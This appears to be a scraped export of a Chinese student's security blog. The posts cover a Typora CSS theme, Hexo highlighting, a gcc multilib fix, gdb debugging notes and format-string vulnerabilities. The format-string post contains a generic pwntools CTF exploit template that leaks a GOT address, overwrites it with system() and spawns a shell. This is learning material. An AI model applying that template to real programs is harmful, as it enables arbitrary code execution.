然后需要修改的是代码高亮的一些相关配色，typora的代码高亮是直接用的css而不是引用highlight.js（感觉也差不多233）。 ​ 然后我们找到代码高亮的css元素（其他的基本都是字体以及留白的一些样式，没有需求可以不用管）,找到对应的元素就可以开始魔改（ ​ (ps:感觉typora还有很多主题的方法可以使用，比如说backgroud = url（），通过这个 插入图片等，但是好像并没有找到类似的文档，我也不想再切图，于是作罢) ​ 其实魔改以后感觉变化也不是特别大，但是魔改的过程还是很有意思。 ​ 顺便附上它的css :root { --side-bar-bg-color: #ffffff; --control-text-color: #424242; --active-file-bg-color: #ffffff; --active-file-border-color: #6B6B6B; --active-file-text-color: #7eadad; --table-even-row-color:#555555; --table-head-color:#7a7979; --deep-theme-color: #343a41; --code-block-bg-color: #292424; } /*serif*/ @font-face { font-family: 'Lexend'; font-weight: normal; font-style: normal; src: url('./mint/Lexend-Regular.ttf') } @font-face { font-family: 'Lexend'; font-weight: bold; font-style: normal; src: url('./mint/Lexend-Bold.ttf') } /*monospace*/ @font-face { font-family: 'SourceCodePro'; font-weight: normal; font-style: normal; src: local(SourceCodePro), url('./mint/SourceCodePro-Regular.ttf') } /*Chinese*/ @font-face { font-family: 'NotoSansSC'; font-weight: normal; font-style: normal; src: url('./mint/NotoSansSC-Regular.otf') } @font-face { font-family: 'NotoSansSC'; font-weight: bold; font-style: normal; src: url('./mint/NotoSansSC-Bold.otf') } html{ font-size: 16px; } body { font-family: 'Lexend','SourceCodePro','NotoSansSC'; font-weight: normal; line-height: 1.5rem; letter-spacing: 0; margin: 0; } #write { max-width: 900px; padding: 30px 50px 20px; } #write p{ text-align:left; } #write pre.md-meta-block { padding: 1rem; font-size: 85%; line-height: 1.45; background-color: #ffffff; border: 0; border-radius: 3px; color: #141414; margin-top: 0 !important; } .md-image&gt;.md-meta { color: #141414; font-size: 0.9rem; font-family: 'Lexend'; padding: 4px 0; } @media print { html,body { font-size: 14px; } table, pre { page-break-inside: avoid; } pre { word-wrap: break-word; } } @page { size: A4; margin: 8mm 0mm; } /*toc*/ .md-toc { margin-top:20px; padding-bottom:20px; color: var(--deep-theme-color); } a { color: var(--deep-theme-color); text-decoration: none; } a:hover { text-decoration: underline; } /*headers*/ h1,h2,h3,h4,h5,h6 { display: block; font-weight:bold; } h1 { font-size: 2em; margin-top: 0.67em; margin-bottom: 0.67em; } h2 { font-size: 1.5em; margin-top: 0.83em; margin-bottom: 0.83em; } h3 { font-size: 1.17em; margin-top: 1em; margin-bottom: 1em; } h4 { font-size: 1em; margin-top: 1.33em; margin-bottom: 1.33em; } h5 { font-size: 1em; margin-top: 1.33em; margin-bottom: 1.33em; color: #777777; } h6 { font-size: 1em; margin-top: 1.33em; margin-bottom: 1.33em; color: #adadad; } p, blockquote, ul, ol, dl, table { margin: 0.8rem 0; } /*table*/ table { border-collapse: collapse; padding: 0; word-break: initial; table-layout: fixed; width: 100%; } table tr:nth-child(even){ background-color: var(--table-even-row-color); } thead{ background-color: var(--table-head-color); } table th{ text-align: center; padding:6px 13px; border: 1px solid var(--table-head-color); } table td{ padding:6px 13px; border: 1px solid var(--table-head-color); } table tr{ padding:6px 13px; border: 1px solid var(--table-head-color); } /*blockquote*/ blockquote { border-left: 0.2rem solid var(--side-bar-bg-color); color: #b4d8e9; font-family: 'Lexend','NotoSansSC'; font-size: 0.9rem; padding-left: 2rem; } /*list*/ li p.first { display: inline-block; } ul, ol { padding-left: 30px; } ul:first-child, ol:first-child { margin-top: 0; } ul:last-child, ol:last-child { margin-bottom: 0; } .md-task-list-item:hover &gt; input:before, input[type='checkbox']:hover:before { opacity: 1; transition: 0.5s; background-color: var(--side-bar-bg-color); } .task-list-item input::before { content: \"\"; display: inline-block; border-radius: 1.1rem; vertical-align: middle; border: 1.2px solid var(--deep-theme-color); background-color: #ffffff; width: 1.1rem; height: 1.1rem; margin-left: -0.1rem; margin-right: 0.1rem; margin-top: -0.68rem; } .task-list-item input:checked::before { padding-left: 0.125em; content: '✔'; color:white; background-color: var(--deep-theme-color); font-size: 0.8rem; line-height: 0.95rem; margin-top: -0.68rem; transition: background-color 200ms ease-in-out; } .task-list-done { text-decoration: line-through; color: #343a41; } hr { border-style: none; border-top-style: solid; border-color: #e7e7e7; border-width: 1px; margin: 2rem 0; } /*highlight*/ #write mark { background-color: #c7ffe8; border-radius: 2px; color: rgb(44, 39, 39); padding: 0 4px; margin: 0 2px; } /*inline code*/ #write code,tt { padding: 0.6px 4px; border-radius: 2px; background-color: rgba(238, 238, 238, 0.39); font-family: 'SourceCodePro',Consolas,Courier, Monospace; font-size: 0.9rem; color: #666666; margin: 0 2px; } /*footnote*/ #write .md-footnote { color: #343a41; background-color: #e4e4e4; } /*source code mode*/ .cm-s-typora-default .cm-header { color: #524a4a; } .cm-s-typora-default .cm-link { color:var(--deep-theme-color); } /*code block*/ #write .md-fences { font-size: 1rem; margin: 0.2em 0; padding: 0.5em; border-radius: 3px; font-size: 0.9em; font-family: 'SourceCodePro',Consolas,Courier, Monospace ; background-color: #fffdfd; color: #a3a3a3; border: none; text-shadow: none; } .md-fences .code-tooltip { background-color: #ffffff; } /* Name: material-ocean Author: Mattia Astorino (http://github.com/equinusocio) Website: https://material-theme.site/ */ .cm-s-inner.CodeMirror { background-color: #ffffff; color: #343a41; } /*.cm-s-inner .CodeMirror-gutters { background: #ffffff; color: #ffffff; border: none; } */ .cm-s-inner .CodeMirror-linenumber {color: #343a41;} .cm-s-inner .CodeMirror-guttermarker { color: #FFEE80; } .cm-s-inner .CodeMirror-guttermarker-subtle { color: #D0D0D0; } /* .cm-s-inner .CodeMirror-cursor { border-left: 1px solid #FFCC00; } .cm-s-inner.cm-fat-cursor .CodeMirror-cursor { background-color: #FFCC00 !important; } .cm-s-inner .cm-animate-fat-cursor { background-color: #FFCC00 !important; } */ .cm-s-inner .CodeMirror-cursor { border-left: 1px solid #A9B7C6; } .cm-s-inner div.CodeMirror-cursor { border-left: 1px solid #ffffff; } .cm-s-inner div.CodeMirror-selected { background: rgba(58, 58, 59, 0.2); } .cm-s-inner.CodeMirror-focused div.CodeMirror-selected { background: rgba(221, 224, 241, 0.2); } .cm-s-inner .CodeMirror-selected{ background: #d6dce7 !important; } .cm-s-inner .CodeMirror-selectedtext { background: #dbdee6 !important; } .cm-overlay.CodeMirror-selectedtext { background: #B5D6FC !important; } .cm-s-inner .CodeMirror-line::selection, .cm-s-inner .CodeMirror-line&gt;span::selection, .cm-s-inner .CodeMirror-line&gt;span&gt;span::selection { background: rgba(221, 224, 241, 0.2); } .cm-s-inner .CodeMirror-line::-moz-selection, .cm-s-inner .CodeMirror-line&gt;span::-moz-selection, .cm-s-inner .CodeMirror-line&gt;span&gt;span::-moz-selection { background: rgba(221, 224, 241, 0.2); } .cm-s-inner .CodeMirror-activeline-background { background: #ffffff; } .cm-s-inner .cm-keyword { color: #8979c0; } .cm-s-inner .cm-operator { color: #25c494; } .cm-s-inner .cm-variable-2 { color: #4f5481; } .cm-s-inner .cm-variable-3, .cm-s-inner .cm-type { color: #f84f57; } .cm-s-inner .cm-builtin { color: #eca622; } .cm-s-inner .cm-atom { color: #F78C6C; } .cm-s-inner .cm-number { color: #ad7a83; } .cm-s-inner .cm-def { color: #82AAFF; } .cm-s-inner .cm-string { color: #70be26; } .cm-s-inner .cm-string-2 { color: #7a232e; } .cm-s-inner .cm-comment { color: #3a4677; } .cm-s-inner .cm-variable { color: #bb584b; } .cm-s-inner .cm-tag { color: #b44457; } .cm-s-inner .cm-meta { color: #b9b717; } .cm-s-inner .cm-attribute { color: #71498a; } .cm-s-inner .cm-property { color: #a075be; } .cm-s-inner .cm-qualifier { color: #f8ce11; } .cm-s-inner .cm-variable-3, .cm-s-inner .cm-type { color: #fce470; } .cm-s-inner .cm-error { color: rgba(255, 255, 255, 1.0); background-color: #FF5370; } .cm-s-inner .CodeMirror-matchingbracket { text-decoration: underline; color: white !important; }","categories":[],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"解决hexo无法显示高亮问题","slug":"解决hexo无法显示高亮问题","date":"2021-10-28T08:13:26.358Z","updated":"2021-10-29T05:59:54.758Z","comments":true,"path":"2021/10/28/解决hexo无法显示高亮问题/","link":"","permalink":"https://fuurinko.github.io/2021/10/28/%E8%A7%A3%E5%86%B3hexo%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BA%E9%AB%98%E4%BA%AE%E9%97%AE%E9%A2%98/","excerpt":"","text":"​ 博客搭了有快一年了，一直是hexo+git page的配置（不过这个搭配现在绝版了2333），但是一直荒废着，差不多到大一暑假的时候才想起要好好经营。 ​ 但是代码高亮这个一直没有解决。 ​ 之前我以为是博客主题配置的问题（就是highlight对象的值的问题），但是无论用怎么样的方法都不太行。 ​ 在研究代码高亮的过程中，我才知道原来有个项目叫highlight.js,里面有各种各样的代码高亮的css文件。 ​ 一开始我是将博客原本的代码高亮的css文件替换成我想要的样式，但是无论替换成什么样式，博客中代码都是蓝色，清一色的蓝色。然后我意识到，这根本不是什么代码高亮的样式，这根本就是，没有代码高亮。 ​ 然后我开始在网上寻找解决方案，搜索的关键词是hexo 无法显示代码高亮，辗转来回，找到了一篇文章。 ​ hexo中highlight.js代码高亮的修改方法 ​ 按照文章中的方法，我在主题layout文件夹中的_post.ejs文件随便找了个角落，把 COPY&lt;!-- Highlight.js --&gt; &lt;link rel=\"stylesheet\" href=\"//highlightjs.org/static/demo/styles/night-owl.css\"&gt; &lt;script src=\"//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js\"&gt; &lt;/script&gt; &lt;script&gt; hljs.initHighlightingOnLoad(); &lt;/script 丢了进去。 ​ 然后我的博客就成功的显示了代码高亮。 ​ 这样看其实看不出什么端倪，具体功能的实现还是要看脚本的内容，但是估计我也看不懂（）。 ​","categories":[],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"解决gcc无法编译32位程序的问题","slug":"解决gcc无法编译32位程序的问题","date":"2021-10-27T12:26:56.705Z","updated":"2021-10-29T05:59:42.130Z","comments":true,"path":"2021/10/27/解决gcc无法编译32位程序的问题/","link":"","permalink":"https://fuurinko.github.io/2021/10/27/%E8%A7%A3%E5%86%B3gcc%E6%97%A0%E6%B3%95%E7%BC%96%E8%AF%9132%E4%BD%8D%E7%A8%8B%E5%BA%8F%E7%9A%84%E9%97%AE%E9%A2%98/","excerpt":"","text":"1）前言​ 之前一直被gcc无法编译32位程序而困扰，但是问题一直拖着没有解决，趁着今天比较闲，把这个问题彻底解决一下。 2)过程​ 首先我们尝试编译32位程序，gcc报错： ​ 缺少头文件，实则是没有安装多架构gcc。 ​ 试图安装，失败，报错如下： ​ 这里有个坑了我好久的东西，就是这个报错 E: Unable to correct problems, you have held broken packages. ​ 无法修正问题，你持有held broken的软件包。 ​ 我一直没有理解正确这个held的意思，我以为是持有的意思，所以一直以来这句话在我眼中的意思是，你已经有这个软件包了，但是你不能安装。 ​ 但实际上，但凡熟悉过apt或者dkpg的一些命令，或者但凡对linux文件系统稍微熟悉一点都知道其实hold是为了防止更新不想更新的软件包，而特殊设置的功能。通过apt- mark或者dpkg命令 ，从apt-get中将特定的软件包的更新排除。而这道题的报错就是源于这点–gcc-7-multilib等依赖的软件包版本不对，但是由于held，所以并没有被更新。 ​ 但是通过dpkg --get-selections | grep hold指令查找held的软件包，并没有任何结果。 ​ 经过各种试错，找到了一个快速解决的方法。 sudo aptitude install gcc-multilib aptitude与apt类似，也是包管理器。但是通过aptitude进行包管理，对于软件包依赖问题的处理更加细节。 ​ 下面是一些常用的命令 aptitude update #更新可用的包列表 aptitude purge &lt;pkgname&gt; #删除包及其配置文件 aptitude search &lt;pkgname&gt; #搜索包 aptitude clean #删除下载的包文件 aptitude autoclean #删除过期的包文件 aptitude执行起来和apt其实不太一样，比如 sudo aptitude install gcc-multilib 这个命令其实执行起来长这样： ​ 然后aptitude会问你 ​ 这里是最大的坑。如果是像我这种不想看英文按照习惯输Y的人，这里会踩一个大坑。 ​ 明确地告诉了我： The following actions will resolve these dependencies: Keep the following packages at their current version: ... ... ... Accept this solution? [Y/n/q/?] 保持下面软件包的版本不变，你接受这个解决方式吗？ 显然我不接受，只要摁下N，问题就解决了。 然后。自动执行gdb-multilib的安装。 问题解决。 3）总结​ 这个问题回过头来想，其实非常简单，如果清楚问题所在的话，只需要一行命令就能解决。当然并不是每个人都经验丰富，但是没有经验，可以积累经验，然而在积累的过程中，有些愚蠢的错误确实是不应该犯的。比如说，不认真看报错信息，或者提示，凭着感觉装。这是我在处理这种问题上最大的弱点。 ​ 一个原因是我骄傲自满了，我确实认为在这一步不会出错，但是实际上问题就是发生在这一步上，另外就是，全英文的屏显，没有人愿意仔细阅读，但是这点没有办法，绝对不可能调成中文，这里只能是说，慢慢看，仔细看 ，然后提升一下英语水平。（但是有一说一，英语母语的人可能都不愿意看吧） 4）参考【Ubuntu】aptitude命令详解 Unable to correct problems, you have held broken packages","categories":[],"tags":[{"name":"linux primary","slug":"linux-primary","permalink":"https://fuurinko.github.io/tags/linux-primary/"}]},{"title":"格式化字符串偏移计算原理及pwntools fmtstr功能源码剖析","slug":"格式化字符串偏移计算原理","date":"2021-10-27T08:36:07.912Z","updated":"2021-11-05T06:41:20.199Z","comments":true,"path":"2021/10/27/格式化字符串偏移计算原理/","link":"","permalink":"https://fuurinko.github.io/2021/10/27/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%81%8F%E7%A7%BB%E8%AE%A1%E7%AE%97%E5%8E%9F%E7%90%86/","excerpt":"","text":"重点研究如何计算32/64位程序中格式化字符串在栈上的偏移，以及研究自动化求偏移的实现 1）32位偏移计算原理​ 其实这个计算确实是有手就行，只需要在栈上找到对应的格式化字符串，然后数是第几个，再减去返回地址所占的一个位置，就是偏移量。 ​ 准确来说应该是格式化字符串在栈上的偏移。 ​ 原理也比较简单。x86架构下，格式化字符串时通过栈传递的。 ​ 然后联想一下函数调用栈的知识点，格式化字符串本身和printf的参数一样，从右到左依次被压栈。 ​ 举一个例子，源码来源于3.1.1 格式化字符串漏洞 //test1.c #include&lt;stdio.h&gt; void main() { printf(\"%s %d %s\", \"Hello World!\", 233, \"\\n\"); } ​ 这个程序没有任何的漏洞，只是因为非常简单直观，拿来研究printf函数参数的传参。 ​ 我们以32位编译。 gcc -m32 test1.c -o test1 ​ 在main函数处下一个断点。然后执行到断点处。 ​ 随便多单步几次，可以看到push指令，此刻主调函数已经开始向栈中压入参数了，从stack 部分我们可以看到，此时栈里已经有一个参数”\\n”。 ​ 继续单步，观察栈的变化，此时栈顶已经扩大了很多，printf的所有需要的参数都在栈中。然后我们需要调用printf函数。 ​ 可以看到，这条指令call printf，我们刚刚压栈的参数此时被printf使用。执行完后的下一条指令使esp加0x10，栈空间缩小，回到最初的样子： ​ 然后回忆一下被调函数参数和局部变量压栈的过程： ​ 主调函数将被调函数参数从右到左压入栈中，随后将返回地址压栈，此时，栈上的参数偏移的计算就非常清晰了。 ​ 这里可能有些弯需要理解一下。大致就是刚刚说到的，主调函数首先将printf需要的函数从右到左依次压栈，（正好栈是从高地址向低地址增长的，所以在gdb stack中呈现的顺序是正常理解的从左到右的先后次序），当将printf需要的参数全部存到栈中后，即可调用printf使用这些参数，此时的栈帧尚属于主调函数，在这个程序中我们不考虑返回地址，所以当参数全部入栈，printf即被调用，栈顶也指向格式化字符串所在的地址。在这里，格式化字符串就是栈上的第一个参数，偏移量就是1。当printf调用完毕，参数即出栈，也就不存在什么格式化字符串偏移了。 2）64位偏移计算原理​ 原理同32位，但是由于64位传参的规则，是先用6个寄存器传参，如果不够再使用栈，但格式化字符串参数被设置是通过栈传递的，所以实际上格式化字符串在栈上是第n+6个参数。 3） pwntools_fmtstr工具​ 在前面的分析中我们可以看到，其实找到格式化字符串的偏移量是一件非常简单的事情，都1202年了，既然是简单的步骤，我们应该需要学会运用自动化工具，使做题步骤简化，比如偏移量的寻找，以及与格式化字符串利用相关的一些事。 ​ pwntools就非常人性化地为我们集成了格式化字符串偏移量寻找，got表覆盖等非常常见好用的操作，这里我们通过简单的例子，着重讨论这些自动化脚本编写的原理。 例子​ 例如，这是一段自动化的格式化字符串漏洞利用的脚本，主要适用于rop并改got表的板子题。 from pwn import * elf = ELF('./') r = process('./') libc = ELF('/') # 计算偏移量 def exec_fmt(payload): r.sendline(payload) info = r.recv() return info auto = FmtStr(exec_fmt) offset = auto.offset # 获得 func 的 got 地址 func_got = elf.got['func']#func通常是一些例如printf或puts的函数 log.success(\"func_got =&gt; {}\".format(hex(func_got))) # 获得 func 的真实地址 payload = p32(func_got) + '%{}$s'.format(offset) r.send(payload) func_addr = u32(r.recv()[4:8]) log.success(\"func_addr =&gt; {}\".format(hex(func_addr))) # 获得 system 的真实地址 system_addr = func_addr - (libc.symbols['func'] - libc.symbols['system']) log.success(\"system_addr =&gt; {}\".format(hex(system_addr))) payload = fmtstr_payload(offset, {func_got : system_addr}) r.send(payload) r.send('/bin/sh') r.recv() r.interactive() ​ ​ 其中脚本的核心就是pwntools的fmtstr功能。fmtstr几乎完全自动化地帮我们完成了偏移寻找，got表覆盖等工作，大大简化了我们的做题流程。 源码分析​ pwntools定义了一个FmtStr类，来实现格式化字符串漏洞的利用。 ​ ps：了解该源码分析需要首先了解简单的面向对象的python程序设计。因为我也不太懂，所以画了个图来归纳一下，大概就是： ​ 所以下图中的代码也就能够理解了，就是将参数传入实例本身。 ​ 然后，是功能实现的第一步–偏移的寻找，也是这篇笔记重点要分析的部分，完整的源码分析会写成一个新的系列。 ​ 很显然这个功能的实现是基于find_offset方法。 ​ 方法的内容其实比较简单： def find_offset(self): marker = cyclic(20)#cyclic 20个字符 for off in range(1,1000):#从1-1000，爆破偏移量 leak = self.leak_stack(off, marker) leak = pack(leak)#leak = p(leak_stack) pad = cyclic_find(leak[:4]) if pad &gt;= 0 and pad &lt; 20: return off, pad else: log.error(\"Could not find offset to format string on stack\") return None, None ​ 而实现方法find_offset，又依靠方法leak_stack def leak_stack(self, offset, prefix=b\"\"): payload = b\"START%%%d$pEND\" % offset leak = self.execute_fmt(prefix + payload) try: leak = re.findall(br\"START(.*?)END\", leak, re.MULTILINE | re.DOTALL)[0] leak = int(leak, 16) except ValueError: leak = 0 return leak ​ cyclic的代码也顺便放一放（ def cyclic_find(subseq, alphabet = None, n = None): if n is None: n = context.cyclic_size if isinstance(subseq, six.integer_types): subseq = packing.pack(subseq, bytes=n) subseq = packing._need_bytes(subseq, 2, 0x80) if len(subseq) != n: log.warn_once(\"cyclic_find() expects %i-byte subsequences by default, you gave %r\\n\" \"Unless you specified cyclic(..., n=%i), you probably just want the first 4 bytes.\\n\" \"Truncating the data at 4 bytes. Specify cyclic_find(..., n=%i) to override this.\", n, subseq, len(subseq), len(subseq)) subseq = subseq[:n] if alphabet is None: alphabet = context.cyclic_alphabet alphabet = packing._need_bytes(alphabet, 2, 0x80) if any(c not in alphabet for c in subseq): return -1 n = n or len(subseq) return _gen_find(subseq, de_bruijn(alphabet, n)) ​ 之前一直对cyclic的实现抱有兴趣，抽个时间可以看看源码分析。 ​ ​ 4）总结​ part1和part2主要涉及汇编对函数调用栈知识，如果对栈溢出熟悉的话其实理解起来真的非常轻松，也没有什么好说的。 ​ 主要的困难集中在part3，也就是对fmtstr功能实现的分析，我从来没有系统地学习过面向对象的编程语言，只会写一写前端的js和简单的py脚本，对于类，对象以及函数，数据类型啥的关系都傻傻搞不清楚，这给我分析源码造成很大的困难。不过好在足够简单，也有时间去分析。以后还是需要搞清楚面向对象程序开发的一些基础知识，在各种方面都是挺有用的，尤其是自动化的一些脚本开发上。 ​ 通过这篇笔记我确实是认识到自动化脚本的重要性，其实我觉得但凡真正入门了pwn，就不会再浪费时间于一些明明可以自动化完成的东西，就比如说rop有相应的脚本roputil，有onegadget，但是我总是拒绝去用这些东西，反而将大把时间浪费于无谓的调试以及历史脚本的复制粘贴上。 ​ 然而简单的题目尚且可以通过手工构造，如果是实战或者盲打，上哪里手工构造呢？我总有一天要面对这个东西，为什么不早点接受呢？ 5）参考​ pwnlib.fmtstr— Format string bug exploitation tools ​ 格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测 ​ pwntools中fmtstr的使用 ​ 3.1.1 格式化字符串漏洞 ​ Python中self用法详解","categories":[],"tags":[{"name":"format","slug":"format","permalink":"https://fuurinko.github.io/tags/format/"}]},{"title":"pwntools(1)-- pwnlib.tube","slug":"pwntools（1）--pwnlib.tube","date":"2021-10-27T03:21:54.156Z","updated":"2021-10-31T15:04:35.146Z","comments":true,"path":"2021/10/27/pwntools（1）--pwnlib.tube/","link":"","permalink":"https://fuurinko.github.io/2021/10/27/pwntools%EF%BC%881%EF%BC%89--pwnlib.tube/","excerpt":"","text":"0)preview​ 一般通过萌新一般在接触pwn的时候，一个必不可少的步骤就是下载pwntools，并且在自己人生第一个脚本上输入： from pwn import* ​ 我也如此。 ​ 在学习pwn知识快一年的今天，倘若还是对pwntools这个神一般的工具迷茫不解，那我确实还不是一个合格的pwn手。 ​ 这个系列的目的是通过简单的源码剖析，辅以相应的例题，探究pwn题，gdb调试，以及pwntools本身的一些玄学。 ​ 第一部分，则是一个至关重要的part–pwnlib.tube 1)进程间通信​ 在了解pwnlib.tube之前，我们需要知道linux进程间通信的一些基础知识，以下所有内容均参考自《csapp》 ​ tbc… ​","categories":[],"tags":[{"name":"pwntools","slug":"pwntools","permalink":"https://fuurinko.github.io/tags/pwntools/"}]},{"title":"gdb附加调试的一些黑魔法","slug":"gdb附加调试的一些黑魔法","date":"2021-10-27T03:21:25.650Z","updated":"2021-11-09T06:55:26.656Z","comments":true,"path":"2021/10/27/gdb附加调试的一些黑魔法/","link":"","permalink":"https://fuurinko.github.io/2021/10/27/gdb%E9%99%84%E5%8A%A0%E8%B0%83%E8%AF%95%E7%9A%84%E4%B8%80%E4%BA%9B%E9%BB%91%E9%AD%94%E6%B3%95/","excerpt":"","text":"1）abstract​ 这个part主要综合了一些奇怪的调试中遇到的问题，不定期更新。 2）格式化字符串-cctf-pwn31）pause（p）导致ERROR: Could not find ELF base问题​ 在开始动调这个exp的时候，发现一个很奇怪的点就是如果下的断点的模式gdb.attach(sh)，那么程序会异常退出，大概是这样： Attaching to program: /home/rin/pwn/ctf-wiki/format/cctf-pwn3/pwn3, process 27837 Reading symbols from /lib/i386-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug//lib/i386-linux-gnu/libc-2.27.so...done. ERROR: Could not find ELF base! done. Reading symbols from /lib/ld-linux.so.2...Reading symbols from /usr/lib/debug//lib/i386-linux-gnu/ld-2.27.so...done. done. Cannot access memory at address 0xf7fad924 warning: Unable to find dynamic linker breakpoint function. GDB will be unable to debug shared library initializers and track explicitly loaded dynamic code. Failed to read a valid object file image from memory. ERROR: Could not find ELF base! ERROR: Could not find ELF base! ERROR: Could not find ELF base! ERROR: Could not find ELF base! ERROR: Could not find ELF base! ERROR: Could not find ELF base! ERROR: Could not find ELF base! 0xf7f85b59 in ?? () ERROR: Could not find ELF base! ERROR: Could not find ELF base! ERROR: Could not find ELF base! ERROR: Could not find ELF base! ​ 首先需要知道这个报错的原因。 ​ 虽然我并没有查到ERROR: Could not find ELF base!这个报错发生的直接trigger，但是很显然这个报错发生是因为程序进程中止，因此无法找到elf base。 ​ 那么进程中止的原因何在？ 解决方案​ 经过大师指点，这个问题其实是因为exp错误（ ​ 这里的问题是在断点之后，我引用了未经定义的payload，导致程序异常退出，然后这个退出反映在gdb中则是elf base not found。 总结​ 如果exp正确，这个报错其实并不会存在。可以反推，如果再次碰到类似的报错，十有八九是exp的问题，而并不能把一切锅推给环境。 3）__kernel_vsyscall？问题​ 上一个问题中提到，如果我们只是输入gdb.attach()，那么程序会断在__kernel_vsyscall这个函数上。遇见这个函数也是不止一次了，但是从未想过要了解它，今天我决定一探究竟。 ​ 我们期望我们的进程暂停在puts payload之前，实际上确实，在此之前，exp没几乎没有任何与远端的io交互，所以断在奇怪的地方也可以理解，那么__kernel_vsyscall是一个怎样的函数，为什么偏偏就断在它的身上呢？ 解决​ 在stackoverflow上，我们能够看出一些端倪。 ​ __kernel_vsyscal is the method used by linux-gate.so (a part of the Linux kernel) to make a system call using the fastest available method, preferably the sysenter instruction. ​ 这其实就是个系统调用方法，回想一下在srop中的知识点，其实每个系统调用都是一个中断，然后系统切换至内核态进行工作，完成后再切换回用户态，并将结果返回至用户态。 ​ 所以出现 __kernel_vsyscal 意味着此刻程序正在进行系统调用。我们同时可以注意到，当 __kernel_vsyscal 函数执行完成，下一个函数则是read函数，也符合我们程序的逻辑–一个菜单题，exp中任何一条语句的结束都将使得函数执行流回到main函数，等待我们的指令。 当然要结束这个函数我们只需要gdb finish。 或者直接使用gdb.attach(sh,”break xxx”)。 关于系统调用我想又可以写一篇专门的博客来研究，这里就不费笔墨了，详情可见： 4）gdb附加调试下断点的几种姿势。1）gdb.attach(p)2）gdb.attach(p,”break &lt;func name&gt;”)3）p = gdb.debug(“elf”,”break &lt;func name&gt;” )5）p = gdb.debug(“elf”,”break &lt;func name&gt;” ) ​ 6）Linux Signal​ 在调试萌新赛题目的时候总是按ctrl+c试图终给程序一个断点，然后就报错。如图 ​ 感觉也不是段错误，反正类似。感觉有必要系统地了解一下linux的信号机制。 ​ 在CSAPP Chapter8 Section5中，我们能看到对于linux signal的详细解释。 ​ signal算是对程序的一种软中断。一般我们能接收到的有关信号处理都是发生在程序异常的时候。然后这里sigint就是当我们按下ctrl+c，内核就给进程发送一个sigint信号，使进程中断。 ​ csapp上一个表非常清晰地描述了一些信号的作用以及对应的默认行为。 ​ ​ 实际的信号不止这三十种。但是一般来说就是这些。 ）参考如何做到一边使用pwntools一边使用gdb下断点到main函数前","categories":[],"tags":[{"name":"gdb","slug":"gdb","permalink":"https://fuurinko.github.io/tags/gdb/"}]},{"title":"格式化字符串漏洞学习","slug":"格式化字符串漏洞利用","date":"2021-10-23T07:05:16.822Z","updated":"2021-11-05T06:41:10.950Z","comments":true,"path":"2021/10/23/格式化字符串漏洞利用/","link":"","permalink":"https://fuurinko.github.io/2021/10/23/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/","excerpt":"","text":"1）前言绿盟杯pwn1，格式化字符串+沙盒orw。保护全开。 首先对于格式化字符串我的理解就不是很深刻，甚至从来没有完整地刷过一道格式化字符串的题目。 所以碰到这道题，算是又给我敲了第nn个警钟。 非常清晰地告诉我：我是垃圾。 2）格式化字符串基本原理ctfwiki上的格式化字符串教程写得挺好的，可以参考。 格式化字符串参数%[parameter][flags][field width][.precision][length]type parameter n$，获取格式化字符串中的指定参数 flag field width 输出的最小宽度 precision 输出的最大长度 length，输出的长度 hh，输出一个字节 h，输出一个双字节 type d/i，有符号整数 u，无符号整数 x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。 o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。 s，如果没有用 l 标志，输出 null结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。 c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。 p， void * 型，输出对应变量的值。printf(“%p”,a) 用地址的格式打印变量 a 的值，printf(“%p”, &amp;a) 打印变量 a 所在的地址。 n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。 格式化字符串漏洞利用一般来说就是打印变量的时候并没有对变量进行格式化，或者格式化的方式并不正确。 一般来说不正确的方式有这几种 一直%s，容易引用不合法的地址，造成程序崩溃 通过打印的相关内存信息，泄露内存布局，获得有用的信息 3)例1:goodluck话不多说，直接上例子。 程序逻辑分析第一步，清晰而准确的逆向是漏洞点利用的基础。 首先，程序读取flag，通过_IO_getc(fp)，一个字符一个字符地将flag读入v10。 然后将flag的首地址给v9。 然后刷新缓冲区。这里这个fflush函数，以前没有怎么深入了解过（ 然后看一个关于fflush的详解 C语言fflush()函数：清空文件缓冲区（或标准输入输出缓冲区） 但是文章中讲的是stdin，和这里的bss段关联感觉并不大，我疑惑的地方不是为什么要fflush，而是疑惑bss段有什么东西。 bss段存储未初始化的全局变量，也不是缓冲区吧。 缓冲区从一个简单的fflush函数中，我们试图理解缓冲区的原理和这个函数被设置的意义。 为了减少cpu对磁盘的读写次数，提高运行速度，缓冲区（这里特指buf）存储了我们的键盘，屏幕输入输出。当我们将字符通过键盘输入到缓冲区中，cingetchar函数再从缓冲区中读取我们的键盘输入，从而进行数据的操作。屏幕输出也是同理。 缓冲区的分类1:全缓冲。只有在缓冲区被填满之后才会进行I/O操作；最典型的全缓冲就是对磁盘文件的读写。 2:行缓冲只有在输入或者是输出中遇到换行符的时候才会进行I/O操作；这忠允许我们一次写一个字符，但是只有在写完一行之后才做I/O操作。一般来说，标准输入流(stdin)和标准输出流(stdout)是行缓冲 3:无缓冲 无缓冲；标准I/O不缓存字符；其中表现最明显的就是标准错误输出流(stderr)，这使得出错信息尽快的返回给用户。 （我以前一直不是很能理解为什么要专门设置一个标准错误，现在知道了，如果error的输出有缓冲区的话，可能要等程序执行到最后才会报错，这样就不能即时地接收到报错） fflush函数然后是关于fflush函数的glibc源码。 